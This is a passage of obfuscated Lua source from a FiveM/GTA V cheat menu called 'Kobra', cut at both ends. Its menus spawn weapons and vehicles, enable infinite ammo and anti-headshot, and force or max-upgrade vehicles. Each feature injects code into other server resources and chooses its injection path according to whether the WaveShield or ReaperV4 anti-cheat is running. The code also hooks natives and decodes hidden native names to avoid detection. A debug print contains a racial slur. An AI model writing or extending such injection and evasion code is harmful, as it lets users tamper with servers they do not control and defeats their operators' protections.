                                ]]);break;end end end end}}}}},{icon="",label="Weapon",type="subMenu",categories={{label="Spawner",tabs={{type="button",label="Give Weapon",onSelect=function() v60("Weapon Name","WEAPON_",function(v589) if (v589 and (v589~="")) then v268:SpawnSelectedWeapon(v589);end end,"typeable");end},{type="button",label="Give All Weapons",onSelect=function() v268:GiveAllWeapons();end},{type="button",label="Remove All Weapons",onSelect=function() v268:RemoveAllWeapons();end},{type="divider",label="All Weapons"},{type="scrollable",label="Melee",scrollType="onEnter",value=1 + 0 ,values=v268:BuildMenuFromWeaponList({"weapon_unarmed","weapon_knife","weapon_dagger","weapon_bat","weapon_bottle","weapon_crowbar","weapon_golfclub","weapon_hammer","weapon_hatchet","weapon_machete","weapon_switchblade","weapon_nightstick","weapon_wrench"}),onSelect=function(v443) v268:SpawnSelectedWeapon(v268:GetWeaponModelFromLabel(v443));end},{type="scrollable",label="Handguns",scrollType="onEnter",value=1,values=v268:BuildMenuFromWeaponList({"weapon_pistol","weapon_pistol_mk2","weapon_combatpistol","weapon_appistol","weapon_stungun","weapon_pistol50","weapon_snspistol","weapon_heavypistol","weapon_vintagepistol","weapon_flaregun"}),onSelect=function(v444) v268:SpawnSelectedWeapon(v268:GetWeaponModelFromLabel(v444));end},{type="scrollable",label="SMGs",scrollType="onEnter",value=4 -3 ,values=v268:BuildMenuFromWeaponList({"weapon_microsmg","weapon_smg","weapon_smg_mk2","weapon_assaultsmg","weapon_machinepistol","weapon_minismg","weapon_combatpdw"}),onSelect=function(v445) v268:SpawnSelectedWeapon(v268:GetWeaponModelFromLabel(v445));end},{type="scrollable",label="Rifles",scrollType="onEnter",value=1 + 0 ,values=v268:BuildMenuFromWeaponList({"weapon_assaultrifle","weapon_assaultrifle_mk2","weapon_carbinerifle","weapon_carbinerifle_mk2","weapon_advancedrifle","weapon_specialcarbine","weapon_bullpuprifle","weapon_gusenberg","weapon_compactrifle","weapon_bullpuprifle_mk2","weapon_marksmanrifle"}),onSelect=function(v446) v268:SpawnSelectedWeapon(v268:GetWeaponModelFromLabel(v446));end},{type="scrollable",label="Shotguns",scrollType="onEnter",value=3 -2 ,values=v268:BuildMenuFromWeaponList({"weapon_pumpshotgun","weapon_pumpshotgun_mk2","weapon_sawnoffshotgun","weapon_assaultshotgun","weapon_bullpupshotgun","weapon_heavyshotgun","weapon_autoshotgun"}),onSelect=function(v447) v268:SpawnSelectedWeapon(v268:GetWeaponModelFromLabel(v447));end},{type="scrollable",label="Snipers",scrollType="onEnter",value=470 -(304 + 165) ,values=v268:BuildMenuFromWeaponList({"weapon_sniperrifle","weapon_heavysniper","weapon_heavysniper_mk2","weapon_marksmanrifle","weapon_marksmanrifle_mk2"}),onSelect=function(v448) v268:SpawnSelectedWeapon(v268:GetWeaponModelFromLabel(v448));end},{type="scrollable",label="Explosives",scrollType="onEnter",value=1970 -(1618 + 351) ,values=v268:BuildMenuFromWeaponList({"weapon_grenade","weapon_stickybomb","weapon_molotov","weapon_pipebomb","weapon_proxmine","weapon_rpg","weapon_grenadelauncher","weapon_rpg","weapon_minigun","weapon_firework"}),onSelect=function(v449) v268:SpawnSelectedWeapon(v268:GetWeaponModelFromLabel(v449));end},{type="scrollable",label="Heavy",scrollType="onEnter",value=1290 -(1140 + 149) ,values=v268:BuildMenuFromWeaponList({"weapon_mg","weapon_combatmg","weapon_gusenberg","weapon_minigun","weapon_grenadelauncher","weapon_railgun","weapon_hominglauncher","weapon_compactlauncher"}),onSelect=function(v450) v268:SpawnSelectedWeapon(v268:GetWeaponModelFromLabel(v450));end},{type="scrollable",label="Throwables",scrollType="onEnter",value=187 -(165 + 21) ,values=v268:BuildMenuFromWeaponList({"weapon_ball","weapon_flare","weapon_smokegrenade","weapon_bzgas","weapon_petrolcan"}),onSelect=function(v451) v268:SpawnSelectedWeapon(v268:GetWeaponModelFromLabel(v451));end}}},{label="Combat",tabs={{type="button",label="Test Button",onSelect=function() print("hi");end},{type="checkbox",label="Infinite Ammo ",desc="Infinite Ammo, this might be detected on certain servers",checked=false,onSelect=function(v452) if v452 then local v648=1397 -(819 + 578) ;while true do if (v648==(1402 -(331 + 1071))) then v268:Notify("success","Kobra","Enabled Infinite Ammo",5743 -(588 + 155) );v268:EnableInfiniteAmmo();break;end end else v268:Notify("error","Kobra","Disabled Infinite Ammo",6282 -(546 + 736) );v268:DisableInfiniteAmmo();end end},{type="checkbox",label="Anti-Headshot",checked=false,desc="This will prevent you from being headshot.",onSelect=function(v453) if v453 then v268:Notify("success","Kobra","Enabled Anti-Headshot",6937 -(1834 + 103) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n) return _G[decode(n)] end

                                            -- native wrappers (obfuscated lookup style)
                                            local SetPedSuffersCriticalHits = g({83,101,116,80,101,100,83,117,102,102,101,114,115,67,114,105,116,105,99,97,108,72,105,116,115})
                                            local PlayerPedId_fn = g({80,108,97,121,101,114,80,101,100,73,100})
                                            local Wait_fn = g({87,97,105,116})

                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                -- initFlow (coroutine runner) — copy of your project's coroutine runner pattern
                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[AntiHeadshot] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.antiHeadshotEnabled and not Unloaded do
                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits(ped, false)
                                                        end
                                                        Wait_fn(0)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            if not _G.antiHeadshotEnabled then
                                                _G.antiHeadshotEnabled = true

                                                local CreateThread_fn = CreateThread
                                                local Wait_fn = Wait
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetPedSuffersCriticalHits_fn = SetPedSuffersCriticalHits

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait_fn(0)
                                                        if not _G.antiHeadshotEnabled then
                                                            Wait_fn(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetPedSuffersCriticalHits_fn(ped, false)
                                                        end

                                                        ::continue::
                                                    end
                                                end)
                                            end
                                            _G.antiHeadshotEnabled = true
                                        ]]);end else v268:Notify("error","Kobra","Disabled Anti-Headshot",5000);if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            -- simply clear the flag; coroutine loop will stop
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false
                                        ]]);else v48("any",[[
                                            if _G.antiHeadshotEnabled == nil then _G.antiHeadshotEnabled = false end
                                            _G.antiHeadshotEnabled = false

                                            -- try to restore default behavior once (best-effort)
                                            if PlayerPedId and SetPedSuffersCriticalHits then
                                                local ped = PlayerPedId()
                                                if ped and ped ~= 0 then
                                                    pcall(function() SetPedSuffersCriticalHits(ped, true) end)
                                                end
                                            end
                                        ]]);end end end}}}}},{icon="",label="Vehicle",type="subMenu",categories={{label="Spawner",tabs={{type="checkbox",label="Teleport Into",desc="If selected, this will teleport you into the selected vehicle.",checked=false,onSelect=function(v454) v43=v454 or false ;end},{type="checkbox",label="Delete Previous",desc="If selected, this will delete your previous vehicle when spawning selected vehicle.",checked=false,onSelect=function(v455) v42=v455 or false ;end},{type="divider",label="All Vehicles"},{type="button",label="Addon",onSelect=function() v60("Addon Vehicle","",function(v590) if (v590 and (v590~="")) then v268:SpawnSelectedVehicle(v590,v43,v42);end end,"typeable");end},{icon="ph ph-car",label="Compacts",type="scrollable",scrollType="onEnter",value=2 -1 ,values={"asbo","blista","brioso","brioso2","brioso3","club","dilettante","dilettante2","issi2","issi3","issi4","issi5","issi6","kanjo","panto","prairie","rhapsody","weevil"},onSelect=function(v456) v268:SpawnSelectedVehicle(v456,v43,v42);end},{icon="ph ph-car",label="Sedans",type="scrollable",scrollType="onEnter",value=1,values={"asea","asea2","asterope","asterope2","cinquemila","driftchavosv6","cog55","cog552","cognoscenti","cognoscenti2","deity","hardy","drifthardy","emperor","emperor2","emperor3","fugitive","glendale","glendale2","impaler5","ingot","intruder","minimus","limo2","premier","primo","primo2","regina","rhinehart","romero","schafter2","schafter5","schafter6","stafford","stanier","stratum","stretch","superd","surge","tailgater","tailgater2","warrener","warrener2","washington"},onSelect=function(v457) v268:SpawnSelectedVehicle(v457,v43,v42);end},{icon="ph ph-car",label="SUVs",type="scrollable",scrollType="onEnter",value=1,values={"aleutian","astron","baller","baller2","baller3","baller4","baller5","baller6","baller7","baller8","bjxl","cavalcade","cavalcade2","cavalcade3","contender","dorado","dubsta","dubsta2","everon3","fq2","granger","granger2","gresley","habanero","huntley","issi8","iwagen","jubilee","landstalker","landstalker2","mesa","mesa2","novak","patriot","patriot2","radi","rebla","rocoto","seminole","seminole2","serrano","squaddie","toros","vivanite","woodlander","xls","xls2"},onSelect=function(v458) v268:SpawnSelectedVehicle(v458,v43,v42);end},{icon="ph ph-car",label="Coupes",type="scrollable",scrollType="onEnter",value=1,values={"cogcabrio","driftfr36","exemplar","f620","felon","felon2","fr36","jackal","kanjosj","oracle","oracle2","postlude","previon","sentinel","sentinel2","windsor","windsor2","zion","zion2"},onSelect=function(v459) v268:SpawnSelectedVehicle(v459,v43,v42);end},{icon="ph ph-car",label="Muscles",type="scrollable",scrollType="onEnter",value=1,values={"blade","brigham","broadway","buccaneer","buccaneer2","buffalo4","buffalo5","chino","chino2","clique","clique2","coquette3","deviant","dominator","dominator2","dominator3","dominator4","dominator5","dominator6","dominator7","dominator8","dominator9","driftdominator10","driftyosemite","dukes","dukes2","dukes3","ellie","eudora","faction","faction2","faction3","gauntlet","gauntlet2","gauntlet3","gauntlet4","gauntlet5","driftgauntlet4","greenwood","hermes","hotknife","hustler","impaler","impaler2","impaler3","impaler4","impaler6","imperator","imperator2","imperator3","lurcher","manana2","moonbeam","moonbeam2","nightshade","peyote2","phoenix","picador","ratloader","ratloader2","ruiner","ruiner2","ruiner3","ruiner4","sabregt","sabregt2","slamvan","slamvan2","slamvan3","slamvan4","slamvan5","slamvan6","stalion","stalion2","tahoma","tampa","tampa3","tampa4","tulip","tulip2","vamos","vigero","vigero2","vigero3","virgo","virgo2","virgo3","voodoo","voodoo2","weevil2","yosemite","yosemite2"},onSelect=function(v460) v268:SpawnSelectedVehicle(v460,v43,v42);end},{icon="ph ph-car",label="Sports Classic",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"ardent","btype","btype2","btype3","casco","cheburek","cheetah2","cheetah3","coquette2","deluxo","dynasty","fagaloa","feltzer3","gt500","infernus2","jb700","jb7002","mamba","manana","michelli","monroe","nebula","peyote","peyote3","pigalle","rapidgt3","retinue","retinue2","savestra","stinger","stingergt","stromberg","swinger","toreador","torero","tornado","tornado2","tornado3","tornado4","tornado5","tornado6","turismo2","viseris","z190","zion3","ztype"},onSelect=function(v461) v268:SpawnSelectedVehicle(v461,v43,v42);end},{icon="ph ph-car",label="Sports",type="scrollable",value=3 -2 ,values={"alpha","banshee","bestiagts","blista2","blista3","buffalo","buffalo2","buffalo3","calico","carbonizzare","comet2","comet3","comet4","comet5","comet6","comet7","coquette","coquette4","corsita","coureur","cypher","drafter","drifteuros","driftfuto","driftjester","driftremus","drifttampa","driftzr350","elegy","elegy2","euros","everon2","feltzer2","flashgt","furoregt","fusilade","futo","futo2","gauntlet6","gb200","growler","hotring","imorgon","issi7","italigto","italirsx","jester","jester2","jester3","jester4","jugular","khamelion","komoda","kuruma","kuruma2","locust","lynx","massacro","massacro2","neo","neon","ninef","ninef2","omnis","omnisegt","panthere","paragon","paragon2","pariah","penumbra","penumbra2","r300","raiden","rapidgt","rapidgt2","rapidgt4","raptor","remus","revolter","rt3000","ruston","schafter3","schafter4","schlagen","schwarzer","sentinel3","sentinel4","sentinel5","seven70","sm722","specter","specter2","stingertt","streiter","sugoi","sultan","sultan2","sultan3","surano","tampa2","tenf","tenf2","tropos","vectre","verlierer2","veto","veto2","vstr","zr350","zr380","zr3802","zr3803"},onSelect=function(v462) v268:SpawnSelectedVehicle(v462,v43,v42);end},{icon="ph ph-car",label="Super",type="scrollable",scrollType="onEnter",value=1,values={"adder","autarch","banshee2","bullet","champion","cheetah","cyclone","deveste","emerus","entity2","entity3","entityxf","fmj","furia","gp1","ignus","infernus","italigtb","italigtb2","krieger","le7b","lm87","nero","nero2","osiris","penetrator","pfister811","prototipo","reaper","s80","sc1","scramjet","sheava","sultanrs","suzume","t20","taipan","tempesta","tezeract","thrax","tigon","torero2","turismo3","turismor","tyrant","tyrus","vacca","vagner","vigilante","virtue","visione","voltic","voltic2","xa21","zeno","zentorno","zorrusso"},onSelect=function(v463) v268:SpawnSelectedVehicle(v463,v43,v42);end},{icon="ph ph-car",label="Motorcycles",type="scrollable",scrollType="onEnter",value=1,values={"akuma","avarus","bagger","bati","bati2","bf400","carbonrs","chimera","cliffhanger","daemon","daemon2","deathbike","deathbike2","deathbike3","defiler","diablous","diablous2","double","enduro","esskey","faggio","faggio2","faggio3","fcr","fcr2","gargoyle","hakuchou","hakuchou2","hexer","innovation","lectro","manchez","manchez2","manchez3","nemesis","nightblade","oppressor","oppressor2","pcj","powersurge","ratbike","reever","rrocket","ruffian","sanchez","sanchez2","sanctus","shinobi","shotaro","sovereign","stryder","thrust","vader","vindicator","vortex","wolfsbane","zombiea","zombieb"},onSelect=function(v464) v268:SpawnSelectedVehicle(v464,v43,v42);end},{icon="ph ph-car",label="Off-Road",type="scrollable",scrollType="onEnter",value=1,values={"bfinjection","bifta","blazer","blazer2","blazer3","blazer4","blazer5","bodhi2","boor","brawler","bruiser","bruiser2","bruiser3","brutus","brutus2","brutus3","caracara","caracara2","dloader","draugur","driftl352","dubsta3","dune","dune2","dune3","dune4","dune5","freecrawler","hellion","insurgent","insurgent2","insurgent3","kalahari","kamacho","l35","l352","marshall","menacer","mesa3","monster","monster3","monster4","monster5","monstrociti","nightshark","outlaw","patriot3","rancherxl","rancherxl2","ratel","rcbandito","rebel","rebel2","riata","sandking","sandking2","technical","technical2","technical3","terminus","trophytruck","trophytruck2","vagrant","verus","winky","yosemite3","zhaba"},onSelect=function(v465) v268:SpawnSelectedVehicle(v465,v43,v42);end},{icon="ph ph-car",label="Industrial",type="scrollable",scrollType="onEnter",value=3 -2 ,values={"bulldozer","cutter","dump","flatbed","flatbed2","guardian","handler","mixer","mixer2","rubble","tiptruck","tiptruck2"},onSelect=function(v466) v268:SpawnSelectedVehicle(v466,v43,v42);end},{icon="ph ph-car",label="Utility",type="scrollable",scrollType="onEnter",value=1348 -(634 + 713) ,values={"airtug","armytanker","armytrailer","armytrailer2","baletrailer","boattrailer","boattrailer2","boattrailer3","caddy","caddy2","caddy3","docktrailer","docktug","forklift","freighttrailer","graintrailer","mower","proptrailer","raketrailer","ripley","sadler","sadler2","scrap","slamtruck","tanker","tanker2","towtruck","towtruck2","towtruck3","towtruck4","tr2","tr3","tr4","tractor","tractor2","tractor3","trailerlarge","trailerlogs","trailers","trailers2","trailers3","trailers4","trailers5","trailersmall","trflat","tvtrailer","tvtrailer2","utillitruck","utillitruck2","utillitruck3"},onSelect=function(v467) v268:SpawnSelectedVehicle(v467,v43,v42);end},{icon="ph ph-car",label="Vans",type="scrollable",scrollType="onEnter",value=1 + 0 ,values={"bison","bison2","bison3","bobcatxl","boxville","boxville2","boxville3","boxville4","boxville5","boxville6","burrito","burrito2","burrito3","burrito4","burrito5","camper","gburrito","gburrito2","journey","journey2","minivan","minivan2","paradise","pony","pony2","rumpo","rumpo2","rumpo3","speedo","speedo2","speedo4","speedo5","surfer","surfer2","surfer3","taco","youga","youga2","youga3","youga4"},onSelect=function(v468) v268:SpawnSelectedVehicle(v468,v43,v42);end}}},{label="Vehicle Customization",tabs={{type="button",label="Set License Plate",onSelect=function() v60("Set License Plate","",function(v591) if (v591 and (v591~="")) then local v730=string.format([[
                                            local function xKqLZVwPt9()
                                                local XcVbNmAsDfGhJkL = PlayerPedId
                                                local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                                                local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                                                local pEd = XcVbNmAsDfGhJkL()
                                                local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                                                if vEh and vEh ~= 0 then
                                                    PoIuYtReWqAzXsDc(vEh, "%s")
                                                end
                                            end

                                            xKqLZVwPt9()
                                        ]],v591);MachoInjectResourceRaw("any",v730);else v12:Notify("Invalid input","Please enter a valid license plate.","error");end end,"typeable");end},{type="button",label="Repair Vehicle",onSelect=function() v268:RepairVehicle();end},{type="button",label="Clean Vehicle",onSelect=function() local v469=0;while true do if ((0 + 0)==v469) then v12:Notify("success","Kobra","Cleaned Vehicle",3000);MachoInjectResourceRaw("any",[[
                            local function qPwRYKz7mL()
                                local a = PlayerPedId
                                local b = GetVehiclePedIsIn
                                local c = SetVehicleDirtLevel

                                local ped = a()
                                local veh = b(ped, false)
                                if veh and veh ~= 0 then
                                    c(veh, 0.0)
                                end
                            end

                            qPwRYKz7mL()
                            ]]);break;end end end},{type="button",label="Force Vehicle Engine",onSelect=function() v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                                GhYtReFdCxWaQzLp = true

                                local function OpAsDfGhJkLzXcVb()
                                    local lMnbVcXzZaSdFg = CreateThread
                                    lMnbVcXzZaSdFg(function()
                                        local QwErTyUiOp         = _G.PlayerPedId
                                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                                        local function _tick(vh)
                                            if vh and vh ~= 0 then
                                                No_Hotwire_Set(vh, false)
                                                En_g_Degrade_Set(vh, false)
                                                ErTyUiOpAsDfGh(vh, false)
                                                KeEpOnAb(vh, true)

                                                local eh = En_g_Health_Get(vh)
                                                if (not eh) or eh < 300.0 then
                                                    En_g_Health_Set(vh, 900.0)
                                                end

                                                ZxCvBnMqWeRtYu(vh, true, true, true)
                                            end
                                        end

                                        while GhYtReFdCxWaQzLp and not Unloaded do
                                            local p  = QwErTyUiOp()

                                            _tick(AsDfGhJkLz(p, false))
                                            _tick(TyUiOpAsDfGh(p))
                                            _tick(AsDfGhJkLz(p, true))

                                            Wait(0)
                                        end
                                    end)
                                end

                                OpAsDfGhJkLzXcVb()
                            ]]);end,function() v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                GhYtReFdCxWaQzLp = false
                                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                if v and v ~= 0 then
                                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
                                    SetVehicleEngineCanDegrade(v, true)
                                    SetVehicleUndriveable(v, false)
                                end
                            ]]);end},{type="button",label="Max Upgrade",onSelect=function() v12:Notify("success","Kobra","Vehicle Max Upgraded",3000);local v470=GetResourceState("WaveShield")=="started" ;local v471=GetResourceState("ReaperV4")=="started" ;if v470 then print("WaveNiggaStarted");MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);elseif v471 then print("using Reaper fallback");MachoInjectThread(0 + 0 ,"any","",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]]);else MachoInjectResourceRaw("any",[[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

